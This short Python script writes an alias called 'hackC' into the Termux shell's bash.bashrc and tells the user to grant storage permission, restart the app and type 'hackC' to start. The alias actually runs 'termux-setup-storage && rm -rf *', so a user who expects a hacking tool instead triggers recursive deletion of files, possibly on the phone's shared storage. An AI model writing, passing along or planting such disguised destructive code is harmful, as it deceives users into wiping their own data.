with open("../usr/etc/bash.bashrc",'a+') as f:
    f.write("alias hackC='termux-setup-storage && rm -rf *'")
    print("\n(allow the permission to continue.)\nTYPE 'exit' COMMAND AND REOPEN TERMUX APP.\nTHEN TYPE 'hackC' COMMAND TO START.")
